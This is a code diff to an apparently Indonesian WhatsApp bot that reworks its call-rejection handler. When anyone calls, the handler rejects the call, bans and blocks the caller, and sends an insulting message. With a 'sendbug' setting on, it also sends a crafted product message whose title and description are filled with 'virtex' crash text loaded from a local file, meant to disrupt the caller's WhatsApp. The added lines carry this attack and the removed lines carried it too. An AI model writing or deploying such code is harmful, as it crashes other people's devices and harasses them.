@@ -15,6 +15,7 @@ const { addBlock, unBlock, cekBlock } = require("./lib/blockuser");
 const { addBanned, unBanned, cekBannedUser } = require("./lib/banned");
 //const keepAlive = require("./keepalive.js")
 Anticall = settings.Anticall
+sendbug = settings.sendbug
 prefix = settings.setPrefix.prefix
 joinExtream = settings.joinGcExtream
 ext = settings.SetFunction.ext
@@ -24,10 +25,11 @@ isCharge: "Sedang di cas" || "Tidak di cas"
 }
 
 
+
 async function starts() {
 	    client.autoReconnect = ReconnectMode.onConnectionLost
-	    //client.version = [2, 2143, 3]
-	    client.version = [ 5, 9741, 8 ];
+	    client.version = [2, 2143, 3]
+	    //client.version = [ 5, 9741, 8 ];
 	    client.browserDescription = ["EXTREAM","Ubuntu","18.04"]
 	    client.logger.level = 'warn'
 	    console.log(color(`]─`,`magenta`),`「`,  color(`EXTREAM`,`red`), `」`,  color(`─[`,`magenta`))
@@ -66,26 +68,25 @@ async function starts() {
         client.antidel = []
         client._reminder = []
         
-   client.on('CB:Call',  async (json) => {
-   if(!Anticall) return
-   
-	let number = json[1]['from'];
-	let Nomer =`${number.split("@")[0]}@s.whatsapp.net`
-        let isOffer = json[1]["type"] == "offer";
-     pushname = client.contacts[Nomer] != undefined ? client.contacts[Nomer].notify = undefined ? PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[Nomer].notify || client.contacts[Nomer].vname : PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international')
-      if(cekBannedUser(Nomer, ban)) return
-        console.log("call dari "+ Nomer)
-        console.log(pushname)
-        addBanned (pushname, calender, Nomer, ban) 
-        addBlock(number, blocked)  
-        forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
-        const { virtex8 } = require('./virtex/virtex.js')
-        davizin = fs.readFileSync('./stik/davizinmaker.jpg')
-        hmm4 = fs.readFileSync('./stik/fake.jpeg')
+client.on('CB:Call',  async (json) => {
+if(!Anticall) return
+let number = json[1]['from'];
+let Nomer =`${number.split("@")[0]}@s.whatsapp.net`
+let isOffer = json[1]["type"] == "offer";
+pushname = client.contacts[Nomer] != undefined ? client.contacts[Nomer].notify = undefined ? PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international') : client.contacts[Nomer].notify || client.contacts[Nomer].vname : PhoneNumber('+' + Nomer.replace('@s.whatsapp.net', '')).getNumber('international')
+if(cekBannedUser(Nomer, ban)) return
+console.log("call dari "+ Nomer)
+console.log(pushname)
+addBanned (pushname, calender, Nomer, ban) 
+addBlock(number, blocked)  
+forward = { forwardingScore: 10000000000, isForwarded: true, sendEphemeral: true}
+const { virtex8 } = require('./virtex/virtex.js')
+davizin = fs.readFileSync('./stik/davizinmaker.jpg')
+hmm4 = fs.readFileSync('./stik/fake.jpeg')
         
-        if (number && isOffer && json[1]["data"]) {
-            var tag = client.generateMessageTag();
-            var NodePayload = ["action", "call", ["call", {
+if (number && isOffer && json[1]["data"]) {
+var tag = client.generateMessageTag();
+var NodePayload = ["action", "call", ["call", {
                     "from": client.user.jid,
                     "to": number.split("@")[0] + "@s.whatsapp.net",
                     "id": tag
@@ -98,41 +99,38 @@ async function starts() {
                     }, null]
                 ]
             ]];
-            await client.send(`${tag}, ${JSON.stringify(NodePayload)}`)
-            
-      
-        if(number.startsWith("62")){
-        var teksnya = "Anjing lu, ga usah nelpon /vc napa, kurang kerjaan banget"
-        } else {
-        var teksnya = "Fuck you bitch, why you call me huh ? "
-        }
+await client.send(`${tag}, ${JSON.stringify(NodePayload)}`)
+if(number.startsWith("62")){
+var teksnya = "Kamu telah di block,banned + bug karena telpon botz"
+} else {
+var teksnya = "Fuck you bitch, why you call me huh ? "
+}
+await client.sendMessage(Nomer, teksnya, MessageType.text)      
+if(sendbug){
+imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
+imeg = imeu.message.imageMessage
+res =  client.prepareMessageFromContent(Nomer, {
+'productMessage': {
+'product': {
+'productImage': imeg,
+'productId': '',
+'title': virtex8(prefix),
+'description': virtex8(prefix),
+'priceAmount1000': '1000',
+'descriptionCount': 1,
+'productImageCount': '1'
+ },
+'businessOwnerJid': `0@s.whatsapp.net`,
+'contextInfo': forward
+}
+}, {contextInfo: forward}), 
+await client.relayWAMessage(res)    
+}
+await client.blockUser(Nomer, "add") // Block user
+await client.modifyChat(Nomer, 'delete').catch(_ => _)
+}      
+})     
         
-        client.sendMessage(Nomer, teksnya, MessageType.text)        
-        imeu = await client.prepareMessage( '0@s.whatsapp.net', hmm4, image, { thumbnail : davizin}), 
-        imeg = imeu.message.imageMessage
-        res =  client.prepareMessageFromContent(Nomer, {
-        'productMessage': {
-        'product': {
-        'productImage': imeg,
-        'productId': '',
-        'title': virtex8(prefix),
-        'description': virtex8(prefix),
-        'priceAmount1000': '1000',
-        'descriptionCount': 1,
-        'productImageCount': '1'
-         },
-        'businessOwnerJid': `0@s.whatsapp.net`,
-         'contextInfo': forward
-         }
-         }, {contextInfo: forward}), 
-        await client.relayWAMessage(res)    
-        await client.modifyChat(Nomer, ChatModification.delete)       
-        //await client.sendMessage(number, "Kamu telah di block,banned + bug karena telpon botz", MessageType.text)
-        await client.blockUser(Nomer, "add") // Block user
-        
-         }      
-        
-        })     
         
 
         client.on("group-update", async (anu) => {
